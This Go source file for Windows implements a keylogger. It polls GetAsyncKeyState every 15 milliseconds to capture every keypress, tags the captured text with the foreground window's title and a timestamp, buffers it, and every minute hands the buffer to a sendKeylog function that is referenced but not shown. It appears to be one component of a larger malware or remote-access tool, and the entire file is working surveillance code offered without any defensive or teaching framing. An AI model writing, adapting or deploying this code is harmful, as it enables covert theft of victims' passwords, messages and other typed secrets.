//go:build windows

package main

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32dll           = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32dll.NewProc("GetAsyncKeyState")
	procGetForeWindow   = user32dll.NewProc("GetForegroundWindow")
	procGetWindowTextW  = user32dll.NewProc("GetWindowTextW")
)

var klBuffer strings.Builder

func runKeylogger() {
	lastWindow := ""
	pollTicker := time.NewTicker(15 * time.Millisecond)
	sendTicker := time.NewTicker(60 * time.Second)

	for {
		select {
		case <-pollTicker.C:
			// Capture active window for context
			hwnd, _, _ := procGetForeWindow.Call()
			if hwnd != 0 {
				buf := make([]uint16, 256)
				procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
				title := syscall.UTF16ToString(buf)
				if title != lastWindow && title != "" {
					klBuffer.WriteString(fmt.Sprintf("\n[%s] %s\n", time.Now().Format("15:04:05"), title))
					lastWindow = title
				}
			}

			for vk := 8; vk <= 255; vk++ {
				state, _, _ := procGetAsyncKeyState.Call(uintptr(vk))
				// Bit 0: key was pressed since last call; bit 15: key is down now
				if state&1 != 0 {
					klBuffer.WriteString(vkToString(vk))
				}
			}

		case <-sendTicker.C:
			if klBuffer.Len() > 0 {
				sendKeylog(klBuffer.String())
				klBuffer.Reset()
			}
		}
	}
}

func vkToString(vk int) string {
	switch vk {
	case 0x08:
		return "[BS]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "\n"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	case 0x25:
		return "[LEFT]"
	case 0x26:
		return "[UP]"
	case 0x27:
		return "[RIGHT]"
	case 0x28:
		return "[DOWN]"
	case 0x2E:
		return "[DEL]"
	case 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39:
		return string(rune('0' + vk - 0x30))
	case 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
		0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,
		0x55, 0x56, 0x57, 0x58, 0x59, 0x5A:
		return strings.ToLower(string(rune('A' + vk - 0x41)))
	case 0xBA:
		return ";"
	case 0xBB:
		return "="
	case 0xBC:
		return ","
	case 0xBD:
		return "-"
	case 0xBE:
		return "."
	case 0xBF:
		return "/"
	case 0xC0:
		return "`"
	case 0xDB:
		return "["
	case 0xDC:
		return "\\"
	case 0xDD:
		return "]"
	case 0xDE:
		return "'"
	}
	return ""
}
